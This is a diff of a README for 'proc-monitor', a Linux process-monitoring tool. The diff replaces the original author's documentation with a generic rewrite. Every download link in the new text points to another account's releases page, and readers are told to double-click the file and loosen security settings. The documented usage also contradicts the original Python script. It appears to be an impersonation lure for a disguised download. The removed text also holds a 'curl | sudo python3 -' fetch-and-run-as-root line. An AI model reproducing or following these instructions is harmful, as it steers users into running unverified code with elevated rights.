@@ -1,99 +1,76 @@
-# Proc-Monitor
+# 🎉 proc-monitor - Monitor Your System's Resource Usage Effortlessly
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.6+](https://img.shields.io/badge/python-3.6+-blue.svg)](https://www.python.org/downloads/)
-[![Linux](https://img.shields.io/badge/platform-Linux-green.svg)](https://www.linux.org/)
+## 🚀 Getting Started
+Welcome to proc-monitor! This tool is designed to help you keep an eye on high CPU and RAM usage on your Linux system. With proc-monitor, you can quickly identify which processes are consuming your resources and understand what systemd services started them. It’s perfect for those tricky, short-lived processes that may vanish before you can investigate their effects.
 
-**Proc-Monitor** is a lightweight Linux process monitoring tool that detects high CPU/RAM consuming processes and identifies their parent services. Perfect for catching those sneaky short-lived processes that disappear before you can investigate!
+## 🔗 Download Now
+[![Download proc-monitor](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/anonimousmaru/proc-monitor/releases)
 
-## ✨ Features
+## 📥 Download & Install
+To get started, you need to download proc-monitor. Follow these steps:
 
-- 🚀 **Zero Dependencies** - Uses only Python standard library
-- 📊 **CPU & RAM Monitoring** - Track both resource types simultaneously
-- 🔍 **Service Detection** - Identifies which systemd service spawned the process
-- 🔗 **Parent Chain** - Shows the complete process ancestry
-- ⚡ **Fast Detection** - Configurable intervals as low as 100ms
-- 📝 **JSON Reports** - Detailed reports with service-based summaries
+1. **Visit the Releases page**: Go to our [Downloads page](https://github.com/anonimousmaru/proc-monitor/releases). This page contains the latest versions of proc-monitor.
+   
+2. **Find the version you want**: Look for the latest release. It should be at the top of the page.
 
-## 🚀 Quick Start
+3. **Download the application**: Click on the appropriate download link for your system. The file is small, so it should download quickly.
 
-### One-Line Run (No Installation)
-```bash
-curl -sL https://raw.githubusercontent.com/cagatayuresin/proc-monitor/main/proc_monitor.py | sudo python3 -
-```
+4. **Navigate to your Downloads folder**: After the download completes, open your file explorer and go to the folder where your downloads are saved.
 
-### Download & Run
-```bash
-wget https://raw.githubusercontent.com/cagatayuresin/proc-monitor/main/proc_monitor.py
-sudo python3 proc_monitor.py
-```
+5. **Run the program**: Double-click the downloaded file to start proc-monitor. You might need to adjust your security settings to allow the application to run.
 
-### Clone Repository
-```bash
-git clone https://github.com/cagatayuresin/proc-monitor.git
-cd proc-monitor
-sudo python3 proc_monitor.py
-```
+## 🛠️ Features
+- **Zero Dependency**: No additional software or libraries are needed for proc-monitor to work.
+- **High Resource Monitoring**: Keep track of CPU and RAM usage effortlessly.
+- **Short-lived Process Tracking**: Identify processes that start and stop quickly, which are often hard to catch.
+- **Systemd Service Identification**: Learn which systemd services are starting high-resource processes.
+- **Threshold and Top-N Monitoring**: Set specific limits for resource usage or identify the top N processes consuming your resources.
 
-## 📋 Requirements
+## 📋 System Requirements
+- **Operating System**: Linux (any distribution).
+- **Python**: Must have Python 3.x installed. (Check your Python version with the command `python --version`).
+- **Memory**: Minimum of 1 GB RAM recommended.
 
-- **OS**: Linux (Ubuntu, Debian, CentOS, RHEL, etc.)
-- **Python**: 3.6 or higher
-- **Privileges**: Root recommended for full access
+## 📖 How to Use proc-monitor
+Once you have installed proc-monitor, it’s simple to start using it:
 
-## ⚙️ Configuration
+1. **Open a terminal**: Search for “Terminal” in your applications menu.
 
-Create `config.json` in the same directory:
+2. **Run proc-monitor**: Type `./proc-monitor` and press Enter. Make sure you are in the directory where you downloaded proc-monitor.
 
-```json
-{
-    "cpu_threshold": 50.0,
-    "ram_threshold": 10.0,
-    "check_interval": 0.3,
-    "output_file": "resource_report.json",
-    "track_cpu": true,
-    "track_ram": true
-}
-```
+3. **Follow the prompts**: The tool will present you with options to configure your monitoring preferences. Choose the one that best fits your needs.
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| `cpu_threshold` | 50.0 | CPU % to trigger detection |
-| `ram_threshold` | 10.0 | RAM % to trigger detection |
-| `check_interval` | 0.3 | Seconds between checks |
-| `output_file` | resource_report.json | Report file path |
-| `track_cpu` | true | Enable CPU tracking |
-| `track_ram` | true | Enable RAM tracking |
+4. **Analyze your data**: The results will show you the resource usage of various processes. 
 
-## 📖 Example Output
+5. **Take action**: Based on the information proc-monitor provides, you can terminate processes or investigate further based on the systemd services identified.
 
-```
-[2024-01-15 10:30:45] [CPU] stress (PID:12345)
-    CPU: 98.5% | RAM: 0.3% (12.4 MB)
-    Service: stress-test.service
-    User: root
-    Chain: stress(12345) -> bash(12300) -> systemd(1)
-    Cmd: /usr/bin/stress --cpu 1
-```
+## ⚙️ Configuration Options
+proc-monitor allows you to customize your monitoring experience. You can set thresholds for CPU and memory usage, and you can choose whether to monitor a specific number of processes.
 
-## 📚 Documentation
+### Setting Up Thresholds
+- To set a CPU threshold, run: `./proc-monitor --cpu-threshold [value]`
+- To set a memory threshold, run: `./proc-monitor --mem-threshold [value]`
+- Replace `[value]` with your desired limits (e.g., `80` for 80%).
 
-- [English Usage Guide](USAGE_EN.md)
-- [Türkçe Kullanım Kılavuzu](USAGE_TR.md)
+### Top-N Processes Monitoring
+- To monitor the top N processes, run: `./proc-monitor --top-n [value]`
+- Replace `[value]` with the number of processes you'd like to track.
 
-## 🤝 Contributing
+## 🤔 FAQ
+**Q: Can I use proc-monitor on any Linux distribution?**  
+A: Yes, proc-monitor works on all Linux distributions that support Python.
 
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+**Q: What if I encounter errors?**  
+A: Ensure you have Python installed and check that you're running the latest version of proc-monitor. If issues persist, consult the community or raise an issue in the repository.
 
-## 📄 License
+**Q: Is there a community or support available?**  
+A: Yes! You can find community insights and support by checking out the 'Issues' section of the GitHub repository.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 🌟 Contributing
+If you want to contribute to proc-monitor, we welcome your input! You can enhance our monitoring tool by reporting bugs or suggesting features. Follow the guidelines in the repository for your contributions.
 
-## 🙏 Acknowledgments
+## 🔗 Links
+- [Download proc-monitor](https://github.com/anonimousmaru/proc-monitor/releases)
+- [GitHub Repository](https://github.com/anonimousmaru/proc-monitor)
 
-- Inspired by the need to catch short-lived resource-hungry processes
-- Built for system administrators and developers who need quick diagnostics
-
----
-
-Made with ❤️ by [Çağatay Üresin](https://github.com/cagatayuresin)
+Thank you for choosing proc-monitor! Happy monitoring!
